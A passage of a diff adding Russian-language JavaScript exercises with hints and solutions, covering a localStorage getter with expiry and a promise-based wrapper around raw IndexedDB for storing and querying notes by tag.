+      localStorage.setItem(key, JSON.stringify(item));
+    }
+
+    function getWithTTL(key) {
+      const raw = localStorage.getItem(key);
+      if (raw === null) return null;
+
+      try {
+        const item = JSON.parse(raw);
+        if (typeof item?.expiresAt !== 'number' || Date.now() > item.expiresAt) {
+          localStorage.removeItem(key);
+          return null;
+        }
+        return item.value;
+      } catch {
+        localStorage.removeItem(key); // испорченный JSON
+        return null;
+      }
+    }
+    ```
+
+    Храним не срок жизни, а момент истечения (`expiresAt`) — тогда при чтении достаточно сравнить его
+    с текущим временем. Проверка `typeof item?.expiresAt` отсекает записи другого формата: например,
+    оставшиеся от старой версии приложения под тем же ключом.
+  </Fragment>
+</Task>
+
+<Task title="Заметки в IndexedDB без библиотек" level="hard">
+  Напишите на сыром API IndexedDB, но с промисами:
+
+  - `openNotesDB()` — открывает базу `'notes-app'` версии 1 с хранилищем `notes` (ключ `id`, автоинкремент)
+    и индексом `byTag` по полю `tag`;
+  - `addNote(db, note)` — добавляет заметку и возвращает её `id`, когда транзакция завершена;
+  - `getNotesByTag(db, tag)` — возвращает массив заметок с этим тегом.
+
+  ```js
+  const db = await openNotesDB();
+  await addNote(db, { text: 'Купить молоко', tag: 'дом' }); // 1
+  await addNote(db, { text: 'Код-ревью', tag: 'работа' }); // 2
+  await addNote(db, { text: 'Полить цветы', tag: 'дом' }); // 3
+
+  const notes = await getNotesByTag(db, 'дом');
+  notes.map((n) => n.text); // ['Купить молоко', 'Полить цветы']
+  ```
+
+  <Fragment slot="hint">
+    Сделайте две вспомогательные функции: `promisify(request)` — промис, который выполняется на `onsuccess`
+    и отклоняется на `onerror`, и `transactionDone(tx)` — промис по `oncomplete`.
+  </Fragment>
+
+  <Fragment slot="solution">
+    ```js
+    function promisify(request) {
+      return new Promise((resolve, reject) => {
+        request.onsuccess = () => resolve(request.result);
+        request.onerror = () => reject(request.error);
+      });
+    }
+
+    function transactionDone(tx) {
+      return new Promise((resolve, reject) => {
+        tx.oncomplete = () => resolve();
+        tx.onerror = () => reject(tx.error);
+        tx.onabort = () => reject(tx.error);
+      });
+    }
+
+    function openNotesDB() {
+      const request = indexedDB.open('notes-app', 1);
+
+      request.onupgradeneeded = () => {
+        const db = request.result;
+        const store = db.createObjectStore('notes', { keyPath: 'id', autoIncrement: true });
+        store.createIndex('byTag', 'tag');
+      };
+
+      return promisify(request);
+    }
+
+    async function addNote(db, note) {
+      const tx = db.transaction('notes', 'readwrite');
+      const id = await promisify(tx.objectStore('notes').add(note));
+      await transactionDone(tx); // данные записаны, только когда транзакция завершилась
+      return id;
+    }
+
+    function getNotesByTag(db, tag) {
+      const tx = db.transaction('notes', 'readonly');
+      return promisify(tx.objectStore('notes').index('byTag').getAll(tag));
+    }
+    ```
+
+    `onsuccess` у запроса записи означает, что операция принята, но транзакция ещё может откатиться
+    (например, если в ней упадёт следующий запрос). Поэтому `addNote` дожидается `oncomplete`.
+    `onupgradeneeded` — единственное место, где можно создавать хранилища и индексы; при смене схемы увеличивают
+    версию базы. Ровно это и делает за вас библиотека `idb`: `openDB`, `tx.done` и методы, возвращающие промисы.
+  </Fragment>
+</Task>
